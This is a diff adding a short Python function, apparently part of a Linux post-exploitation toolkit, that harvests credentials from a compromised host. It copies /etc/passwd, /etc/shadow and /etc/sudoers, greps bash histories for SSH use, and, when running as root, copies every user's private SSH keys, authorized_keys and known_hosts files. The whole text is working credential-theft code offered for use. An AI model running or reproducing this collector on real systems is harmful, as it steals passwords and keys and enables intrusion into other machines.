@@ -1,0 +1,53 @@
+
+def creds():
+    '''
+    @description: Gather user and system credentials. Looks for passwords, SSH keys, SSL certs, certain application creds, user histories and more.
+    @author: ohdae [bindshell@live.com]
+    '''
+
+    users()
+    
+    save_file('/etc/passwd')
+    save_file('/etc/shadow')
+    save_file('/etc/sudoers')
+    save_file('/etc/ssh/sshd_config')
+    cmd2txt('lastlog', 'lastlog.txt')
+    cmd2txt('getent aliases', 'mail_aliases.txt')
+
+    if currentuser == "root":
+        cmd2txt('find / -maxdepth 3 -name .ssh', 'ssh_locations.txt')
+        for user in userlist:
+            if os.path.exists("/home/%s" % user) is True:
+                cmd2txt("ls /home/%s/.ssh/*" % user, "ssh_%s.txt" % user) 
+    else:
+        cmd2txt("ls %s/.ssh/*" % Home_Dir, "ssh_contents.txt")
+  
+
+    for user in userlist:
+        if os.path.exists("/home/%s/.bash_history" % user) is True:
+            cmd2txt("cat /home/%s/.bash_history | grep ssh" % user, "%s-SSH-History.txt" % user)
+        if currentuser == "root":
+            if os.path.exists("%s/.bash_history" % Home_Dir) is True:
+                cmd2txt("cat %s/.bash_history | grep ssh" % Home_Dir, "Root-SSH-History.txt")
+
+
+    if currentuser == "root":
+        for user in userlist:
+            save_file("/home/%s/.ssh/id_dsa" % user)
+            save_file("/home/%s/.ssh/id_dsa.pub" % user)
+            save_file("/home/%s/.ssh/id_rsa" % user)
+            save_file("/home/%s/.ssh/id_rsa.pub" % user)
+            save_file("/home/%s/.ssh/authorized_keys" % user)
+            save_file("/home/%s/.ssh/config" % user)
+            save_file("/home/%s/.ssh/known_hosts" % user)
+
+    save_file("%s/.ssh/id_dsa" % Home_Dir)
+    save_file("%s/.ssh/id_dsa.pub" % Home_Dir)
+    save_file("%s/.ssh/id_rsa" % Home_Dir)
+    save_file("%s/.ssh/id_rsa.pub" % Home_Dir)
+    save_file("%s/.ssh/authorized_keys" % Home_Dir)
+    save_file("%s/.ssh/config" % Home_Dir)
+    save_file("%s/.ssh/known_hosts" % Home_Dir)
+
+creds()
+
